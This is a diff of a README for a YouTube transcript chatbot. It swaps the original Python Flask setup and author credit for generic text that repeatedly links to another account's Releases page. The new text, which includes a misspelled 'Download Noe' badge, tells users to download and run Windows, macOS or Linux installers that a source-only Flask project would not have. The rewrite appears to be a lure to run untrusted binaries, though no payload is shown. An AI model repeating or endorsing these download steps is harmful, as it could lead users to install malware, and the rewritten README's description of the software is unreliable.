@@ -1,126 +1,89 @@
-# YouTube Chatbot
+# 🎙️ youtube-chatbot - Learn and Chat with YouTube Videos
 
-An intelligent, fully dynamic Retrieval-Augmented Generation (RAG) chatbot that answers questions about any YouTube video you provide.  
-It uses **OpenAI Whisper** for transcription, **OpenAI embeddings (small)** for semantic search, and **Gemini** for generating responses, all via API keys. No local models are required.
+## 🌟 Overview
+youtube-chatbot is an intelligent chatbot that learns from YouTube videos. It automatically transcribes video content, creates meaningful embeddings, and answers your questions based on the video's context. This tool can enhance your engagement with video content, making learning more interactive and enjoyable.
 
----
+## 🚀 Getting Started
+To get started with the youtube-chatbot, follow the steps below. You will find that setting it up takes only a few minutes, allowing you to dive straight into exploring the chatbot's features.
 
-## 🚀 Key Features
-- **Dynamic YouTube Video Learning**: Enter any video URL and the bot automatically processes it.  
-- **Audio Conversion & Transcription**: Video is converted to audio, then transcribed using **OpenAI Whisper**.  
-- **JSON Storage**: Transcriptions are stored in JSON format for structured processing.  
-- **OpenAI Embeddings**: Transcript chunks are converted into embeddings for semantic retrieval.  
-- **User Query Matching**: Queries are converted into embeddings and matched using cosine similarity.  
-- **Gemini API Responses**: Generates context-aware answers based on the relevant transcript; replies with "Information not available in the provided video" if no match exists.  
-- **Flask Web Interface**: Interactive and user-friendly chat interface.
+## 🔗 Download the Application
+[![Download Now](https://img.shields.io/badge/Download%20Noe-brightgreen)](https://github.com/KartherGodfrey/youtube-chatbot/releases)
 
----
+You can find the latest version of the youtube-chatbot on our Releases page. Make sure to visit the link below to download the application:
 
-## 🛠️ Tech Stack
-- **Python 3**
-- **Flask** for web backend
-- **HTML/CSS/JS** for frontend templates
-- **OpenAI Whisper API** for transcription
-- **OpenAI Embeddings (small)** for vectorization
-- **Gemini API** for LLM responses
-- **Cosine Similarity** for Nearest neighbor search
+[Download from Releases Page](https://github.com/KartherGodfrey/youtube-chatbot/releases)
 
----
+## 🛠️ System Requirements
+Before downloading, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent Linux distribution
+- **RAM:** At least 4 GB of RAM
+- **Storage:** Minimum of 200 MB free disk space
+- **Internet Connection:** Required for downloading videos and chatbot updates
 
-## 📁 Project Structure
+## 📥 Download & Install
+1. Click this link to go to our [Releases page](https://github.com/KartherGodfrey/youtube-chatbot/releases).
+2. Look for the latest version listed. 
+3. Choose the applicable package for your operating system (Windows, macOS, or Linux).
+4. Click on the download link next to your selected version.
+5. Once downloaded, find the file in your Downloads folder. 
+   - For Windows, it may be a `.exe` file.
+   - For macOS, look for a `.dmg` file.
+   - For Linux, it may be a `.deb` or `.tar.gz` file.
+6. Open the downloaded file and follow the on-screen instructions to install the application.
 
-```
-youtube-chatbot/
-├── app.py 
-├── backend/
-│ ├── embeddings.py 
-│ ├── mp3_to_json.py 
-│ ├── process_incomings.py
-│ └── yt_to_mp3.py 
-├── templates/ 
-│ └── index.html 
-├── static/ 
-│ ├── style.css 
-│ └── script.js 
-├── requirements.txt 
-└── README.md
-```
+## 🖥️ Running the Application
+After installing, follow these steps to run the youtube-chatbot:
 
+1. Locate the installed application:
+   - For Windows, you can find it in your Start Menu.
+   - For macOS, check the Applications folder.
+   - For Linux, you can search for it in your applications menu.
+   
+2. Open the application. The chatbot will ask for a YouTube video URL.
+3. Paste the URL of the video you want the chatbot to learn from.
+4. Click “Start Chat.” The chatbot will transcribe the video and be ready to answer your questions.
 
----
+## ❓ How to Use the Chatbot
+Here's how you can interact with the chatbot:
 
-## 🧭 How It Works
-1. User provides a **YouTube URL**.  
-2. Video is converted to **audio** using `yt_to_mp3.py`.  
-3. Audio is transcribed via **OpenAI Whisper** using `mp3_to_json.py` and stored as JSON.  
-4. Transcript chunks are converted into embeddings with `embeddings.py` using OpenAI Embeddings (small).  
-5. User query is also converted into embeddings.  
-6. **Cosine similarity** is computed between query and transcript embeddings via `process_incomings.py`.  
-7. The most relevant transcript chunk is sent to **Gemini API** for a response.  
-8. If no relevant information exists, the bot replies:  
-   > "Information not available in the provided video."  
-9. Response is displayed in the Flask web UI (`index.html`).
+1. **Ask Questions**: Once the chatbot has processed the video, type in your questions related to the content.
+2. **Chat**: Engage in a back-and-forth conversation about the video. The chatbot will provide responses based on the information it learned.
+3. **Explore Features**:
+   - Learn: Gain insights or clarification on concepts from the video.
+   - Test Knowledge: Challenge the chatbot with questions to test your understanding.
 
----
+## 🛠️ Features
+- **Automatic Transcription**: Converts video audio to text seamlessly.
+- **Intent Recognition**: Understands user questions for accurate responses.
+- **Contextual Answers**: Provides replies based on the video’s content.
+- **User-Friendly Interface**: Easy navigation designed for anyone.
 
-## 📌 Setup Instructions
-1. Clone the repository:
-```
-git clone https://github.com/MuhammadUsman-Khan/youtube-chatbot.git
-cd youtube-chatbot
-```
-2. Install dependencies:
-```
-pip install -r requirements.txt
+## 📌 Troubleshooting
+If you encounter issues while downloading or using the application, consider the following solutions:
 
-```
+- **Installation Issues**: Ensure that your operating system is compatible as mentioned in the system requirements.
+- **Chatbot Doesn’t Respond**: Verify that you provided a valid YouTube video URL. Try a different video if the issues persist.
+- **Performance Lag**: Close other applications to free up system resources.
 
-3. Set environment variables for API keys:
-```
-export OPENAI_API_KEY="your_openai_key"
-export GEMINI_API_KEY="your_gemini_key"
+## 💬 Support
+For additional support, reach out through the GitHub repository. You can open issues for questions or suggestions. The community will be more than willing to assist you.
 
-```
+## 🌐 Topics Used
+- ai
+- chatbot
+- embeddings
+- flask
+- gemini
+- llm
+- openai
+- rag
+- rag-chatbot
+- retrieval-augmented-generation
+- youtube
 
-4. Run the Flask app:
-```
-python app.py
-
-```
-
-5. Open your browser at http://127.0.0.1:5000/ and start chatting with the bot.
+## 📜 License
+This project is licensed under the MIT License. You can use, modify, and distribute it as long as you include proper attribution.
 
 ---
 
-## 📌 requirements.txt
-
-```
-Flask==3.1.2
-imageio_ffmpeg==0.6.0
-joblib==1.5.0
-numpy==2.3.4
-openai==2.7.1
-openai_whisper==20250625
-pandas==2.3.3
-python-dotenv==1.2.1
-Requests==2.32.5
-scikit_learn==1.7.2
-```
-
-## ✅ Notes & Improvements
-
-- Fully dynamic; no local models required.
-
-- Transcript quality depends on YouTube captions and audio clarity.
-
-- Reduce Time Complexity and make it faster.
-
-- Frontend can be enhanced with chat history, typing indicators, and UI themes.
-
-## 🤝 Contributing
-
-Feel free to fork the repo, submit issues, or create pull requests. Contributions are welcome!
-
-## 🖊️ Author & Developer
-
-#### Muhammad Usman Khan
+For the latest updates, features, and new releases, regularly check the [Releases page](https://github.com/KartherGodfrey/youtube-chatbot/releases). Happy chatting with your favorite YouTube videos!
